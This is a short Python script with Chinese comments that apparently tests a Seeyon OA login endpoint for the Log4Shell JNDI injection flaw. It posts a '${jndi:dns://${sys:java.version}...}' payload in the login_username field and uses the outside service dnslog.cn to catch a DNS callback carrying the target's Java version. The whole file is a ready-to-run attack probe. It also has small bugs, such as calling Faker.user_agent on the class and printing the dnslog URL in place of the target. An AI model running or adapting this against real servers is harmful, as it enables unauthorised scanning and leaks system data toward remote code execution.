import requests
import argparse
from faker import Faker
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/seeyon/nain.do?nethod=login，参数是login_username',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url2 = args.url[:-1] + "/seeyon/nain.do?nethod=login"  # 移除末尾的斜杠
    else:
        url2 = args.url + "/seeyon/nain.do?nethod=login"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()
url = 'http://www.dnslog.cn/getdomain.php'
headers = {
    'User-Agent':  Faker.user_agent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}
url1 = 'http://www.dnslog.cn/getrecords.php'
response = requests.get(url, headers=headers)
dns = response.text

data = {
    'login_username': '${jndi:dns://${sys:java.version}.' + dns + '}'
}

response1 = requests.post(url2, headers=headers, data=data)
response2 = requests.get(url1, headers=headers)

if response2.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞，请检查DNSlog是否能用" + "DNSlog地址为http://www.dnslog.cn")
